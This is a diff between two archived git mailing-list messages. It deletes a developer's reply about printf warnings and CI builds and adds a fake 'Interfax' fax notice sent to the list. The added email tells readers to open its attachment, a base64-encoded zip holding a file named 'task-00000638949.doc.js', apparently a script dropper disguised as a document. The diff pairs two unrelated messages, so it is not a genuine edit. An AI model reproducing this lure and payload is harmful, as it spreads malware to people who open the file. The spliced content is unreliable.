@@ -1,130 +1,103 @@
-From: Lars Schneider <larsxschneider@gmail.com>
-Subject: Re: [PATCH] http: fix some printf format warnings on 32-bit builds
-Date: Fri, 13 Nov 2015 13:08:52 +0100
-Message-ID: <23C0ED03-3773-49AC-A03B-F5E35B9E12D0@gmail.com>
-References: <56428A6A.5010406@ramsayjones.plus.com> <CAPig+cR+jXgw7+kUK9vrZxNbytwyK3gzgm1YPf_6s57_UxPaBA@mail.gmail.com> <CAGZ79kb1pDhcP+hN9+C0xK-VYKxfnhvj6a2Len6kOWgmv4+fmQ@mail.gmail.com> <56437F96.2070209@ramsayjones.plus.com> <71B4BDE3-153C-4918-A23A-F45F0228A988@gmail.com> <CAPig+cRjDVPHH3VH-Mv_KJTeOVyxV-6agHDk+bXqZ4kjJoaLJQ@mail.gmail.com> <5645BC55.70504@web.de>
-Mime-Version: 1.0 (Mac OS X Mail 9.1 \(3096.5\))
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: QUOTED-PRINTABLE
-Cc: Eric Sunshine <sunshine@sunshineco.com>,
-	Ramsay Jones <ramsay@ramsayjones.plus.com>,
-	Stefan Beller <sbeller@google.com>, Jeff King <peff@peff.net>,
-	Junio C Hamano <gitster@pobox.com>,
-	GIT Mailing-list <git@vger.kernel.org>
-To: =?utf-8?Q?Torsten_B=C3=B6gershausen?= <tboegi@web.de>
-X-From: git-owner@vger.kernel.org Fri Nov 13 13:09:01 2015
+From: "Interfax Service" <incoming@interfax.net>
+Subject: You have new fax, document 00000638949
+Date: Fri, 13 Nov 2015 12:24:21 +0000
+Message-ID: <503b0a56f84bea2d6c39a62574fb9af8@simpleincomesystem.com>
+Reply-To: "Interfax Service" <incoming@interfax.net>
+Mime-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="b1_b945bac5e890571ff4c73ce807f0619e"
+Content-Transfer-Encoding: 8bit
+To: git@vger.kernel.org
+X-From: git-owner@vger.kernel.org Fri Nov 13 15:08:13 2015
 Return-path: <git-owner@vger.kernel.org>
 Envelope-to: gcvg-git-2@plane.gmane.org
 Received: from vger.kernel.org ([209.132.180.67])
 	by plane.gmane.org with esmtp (Exim 4.69)
 	(envelope-from <git-owner@vger.kernel.org>)
-	id 1ZxDA4-00045c-4g
-	for gcvg-git-2@plane.gmane.org; Fri, 13 Nov 2015 13:09:00 +0100
+	id 1ZxF0s-0006i1-QI
+	for gcvg-git-2@plane.gmane.org; Fri, 13 Nov 2015 15:07:39 +0100
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1754492AbbKMMI4 convert rfc822-to-quoted-printable (ORCPT
-	<rfc822;gcvg-git-2@m.gmane.org>); Fri, 13 Nov 2015 07:08:56 -0500
-Received: from mail-wm0-f48.google.com ([74.125.82.48]:33566 "EHLO
-	mail-wm0-f48.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1753663AbbKMMIz convert rfc822-to-8bit (ORCPT
-	<rfc822;git@vger.kernel.org>); Fri, 13 Nov 2015 07:08:55 -0500
-Received: by wmec201 with SMTP id c201so78147750wme.0
-        for <git@vger.kernel.org>; Fri, 13 Nov 2015 04:08:54 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=content-type:mime-version:subject:from:in-reply-to:date:cc
-         :content-transfer-encoding:message-id:references:to;
-        bh=MDQiU+AXmmTdqTL0wu0b2ctvoBCR/p82/sleVPC4yno=;
-        b=ylPyANSOggIIBewR3pbYgiwF0ljiOXQ0Sxt6LHw9DCEMqZiInmJY2U8TDsheYmORM1
-         L98yCh35FnlS41sR8Q+/AujHmABbiSCEX3uxpzqZw/k7GIwVCk7Jm7V48JKDIpMaMqSr
-         vDNFVSi+84ls++RZvO8hMGrIkTpHfxZUZ/EmsLeHC4NAI94wGypdS8Ao3wrFv14Ol+ny
-         M9bv4H3su953pUNDUZZ6Oxz4kqKcnNiz/WAZyNgVegyexLxl2flfuksw1peW/xFGQog5
-         Vt1IdLpYUs+HLQU/XfmJXF3wzq9bzZksVjl3LOBs356uACHjTC2XBNa6JwY/8PyKtlfu
-         NYiQ==
-X-Received: by 10.194.94.100 with SMTP id db4mr21262286wjb.110.1447416533810;
-        Fri, 13 Nov 2015 04:08:53 -0800 (PST)
-Received: from slxbook4.ads.autodesk.com ([62.159.156.210])
-        by smtp.gmail.com with ESMTPSA id e189sm3698254wma.4.2015.11.13.04.08.52
-        (version=TLS1 cipher=ECDHE-RSA-AES128-SHA bits=128/128);
-        Fri, 13 Nov 2015 04:08:53 -0800 (PST)
-In-Reply-To: <5645BC55.70504@web.de>
-X-Mailer: Apple Mail (2.3096.5)
+	id S1754735AbbKMOHT (ORCPT <rfc822;gcvg-git-2@m.gmane.org>);
+	Fri, 13 Nov 2015 09:07:19 -0500
+Received: from [69.167.138.139] ([69.167.138.139]:45475 "EHLO
+	host.nextlevelmediainc.com" rhost-flags-FAIL-FAIL-OK-OK)
+	by vger.kernel.org with ESMTP id S1753551AbbKMOHQ (ORCPT
+	<rfc822;git@vger.kernel.org>); Fri, 13 Nov 2015 09:07:16 -0500
+X-Greylist: delayed 6174 seconds by postgrey-1.27 at vger.kernel.org; Fri, 13 Nov 2015 09:07:16 EST
+Received: from simpleis by host.nextlevelmediainc.com with local (Exim 4.86)
+	(envelope-from <simpleis@host.nextlevelmediainc.com>)
+	id 1ZxDOv-00075j-Jb
+	for git@vger.kernel.org; Fri, 13 Nov 2015 07:24:21 -0500
+X-PHP-Originating-Script: 504:post.php(5) : regexp code(1) : eval()'d code(17) : eval()'d code
+X-Priority: 3
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - host.nextlevelmediainc.com
+X-AntiAbuse: Original Domain - vger.kernel.org
+X-AntiAbuse: Originator/Caller UID/GID - [504 501] / [47 12]
+X-AntiAbuse: Sender Address Domain - host.nextlevelmediainc.com
+X-Get-Message-Sender-Via: host.nextlevelmediainc.com: authenticated_id: simpleis/only user confirmed/virtual account not confirmed
+X-Authenticated-Sender: host.nextlevelmediainc.com: simpleis
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
-Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/281248>
+Archived-At: <http://permalink.gmane.org/gmane.comp.version-control.git/281249>
+
+--b1_b945bac5e890571ff4c73ce807f0619e
+Content-Type: text/plain; charset=us-ascii
+
+You have received a new fax.
+
+To view it please open the attachment.
+
+Quality:             500 DPI
+Scan time:           53 seconds
+Filesize:            144 Kb
+Pages number:        4
+Fax name:            task-00000638949.doc
+Author:              Leon Banks
+Scanned:             Fri, 13 Nov 2015 02:34:44 +0300
+
+Thank you for using Interfax!
 
 
-> On 13 Nov 2015, at 11:32, Torsten B=C3=B6gershausen <tboegi@web.de> w=
-rote:
->=20
-> On 2015-11-13 09.57, Eric Sunshine wrote:
->> On Fri, Nov 13, 2015 at 3:46 AM, Lars Schneider
->> <larsxschneider@gmail.com> wrote:
->>> On 11 Nov 2015, at 18:49, Ramsay Jones <ramsay@ramsayjones.plus.com=
-> wrote:
->>>> On 11/11/15 02:00, Stefan Beller wrote:
->>>>> On Tue, Nov 10, 2015 at 5:22 PM, Eric Sunshine <sunshine@sunshine=
-co.com> wrote:
->>>>>> On Tue, Nov 10, 2015 at 7:23 PM, Ramsay Jones
->>>>>> <ramsay@ramsayjones.plus.com> wrote:
->>>>>>> Commit f8117f55 ("http: use off_t to store partial file size",
->>>>>>> 02-11-2015) changed the type of some variables from long to off=
-_t.
->>>>>>> The 32-bit build, which enables the large filesystem interface
->>>>>>> (_FILE_OFFSET_BITS =3D=3D 64), defines the off_t type as a 64-b=
-it
->>>>>>> integer, whereas long is a 32-bit integer. This results in a co=
-uple
->>>>>>> of printf format warnings.
->>>>>>=20
->>>>>> My machine is 64-bit, though, so perhaps it's misleading to
->>>>>> characterize this as a fix for 32-bit builds. In particular, off=
-_t is
->>>>>> 'long long' on this machine, so it complains about the "long" fo=
-rmat
->>>>>> specifier.
->>>>>=20
->>>>> I wonder if 32 bit compilation can be part of travis.
->>>>=20
->>>> Did this warning show up on the OS X build?
->>>=20
->>> Yes, I added CFLAGS=3D"-Werror=3Dformat" to the my experimental Tra=
-visCI
->>> build and it breaks the build on OS X.
->>> See here (you need to scroll all the way down):
->>> https://travis-ci.org/larsxschneider/git/jobs/90899656
->>>=20
->>> BTW: I tried to set "-Werror" but then I got a bunch of macro redef=
-ined errors like this:
->>> ./git-compat-util.h:614:9: error: 'strlcpy' macro redefined [-Werro=
-r]
->>>=20
->>> Is this a known issue? Is this an issue at all?
->>=20
->> Odd. I don't experience anything like that on my Mac.
->=20
-> Could it be, that strlcpy is present on your system ?
-> And where does it come from ?
->=20
-> Which OS ?
-> Which compiler ?
-> What does `uname -r` say ?
-> Do you have Macports, Fink, Brew... installed ?
->=20
+--b1_b945bac5e890571ff4c73ce807f0619e
+Content-Type: application/zip; name="task-00000638949.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=task-00000638949.zip
 
-Looks like this is a OS X only issue. Happens with clang and gcc on the=
- OS X Mavericks TravisCI machines [1]:
-https://travis-ci.org/larsxschneider/git/jobs/90919078
-https://travis-ci.org/larsxschneider/git/jobs/90919080
+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
 
-On Linux+gcc the following error happens if "-Werror" is present:
-https://travis-ci.org/larsxschneider/git/jobs/90919076
-Do you have an idea what that might be?
 
-Linux+clang works fine:
-https://travis-ci.org/larsxschneider/git/jobs/90919074
-
-- Lars
-
-[1] http://docs.travis-ci.com/user/ci-environment/
+--b1_b945bac5e890571ff4c73ce807f0619e--
